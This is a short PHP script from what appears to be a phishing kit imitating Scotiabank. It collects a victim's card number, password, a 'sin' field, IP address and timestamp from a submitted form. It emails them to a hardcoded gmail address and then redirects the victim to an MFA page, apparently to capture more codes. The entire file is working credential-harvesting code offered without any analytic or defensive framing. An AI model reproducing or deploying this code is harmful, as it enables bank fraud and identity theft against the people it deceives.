<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('UTC'); 
$cc = $_POST['cardNumberInputText'];
$pp = $_POST['passwordInputText'];
$timedate = date("D/M/Y g:i A");
$data ="
=============##SCOTIA##========================
USER : $cc
pass : $pp
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate";

$subj="##SCO #$ip";

$emailusr = 'medahnabil@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: ./mfaAuth.html");

?>